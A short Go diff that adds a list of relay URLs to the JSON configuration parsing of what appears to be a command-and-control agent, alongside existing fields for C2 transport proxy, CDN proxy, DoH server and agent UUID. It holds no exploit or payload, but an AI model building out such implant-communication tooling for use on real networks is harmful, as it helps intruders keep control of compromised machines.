@@ -55,6 +55,7 @@ type jsonConfig struct {
 	CAFingerprint             string                  `json:"ca_fingerprint"`
 	C2TransportProxy          string                  `json:"c2_transport_proxy"`
 	CDNProxy                  string                  `json:"cdn_proxy"`
+	RelayURLs                 []string                `json:"relay_urls"`
 	DoHServer                 string                  `json:"doh_server"`
 	AgentUUID                 string                  `json:"agent_uuid"`
 	AgentUUIDSig              string                  `json:"agent_uuid_sig"`
@@ -185,6 +186,9 @@ func readJSONConfig(jsonData []byte, config_to_write *def.Config) (err error) {
 	config_to_write.CAFingerprint = getString("ca_fingerprint")
 	config_to_write.C2TransportProxy = getString("c2_transport_proxy")
 	config_to_write.CDNProxy = getString("cdn_proxy")
+	if arr := getStringSlice("relay_urls"); len(arr) > 0 {
+		config_to_write.RelayURLs = arr
+	}
 	config_to_write.DoHServer = getString("doh_server")
 	if val := getString("agent_uuid"); val != "" {
 		config_to_write.AgentUUID = val
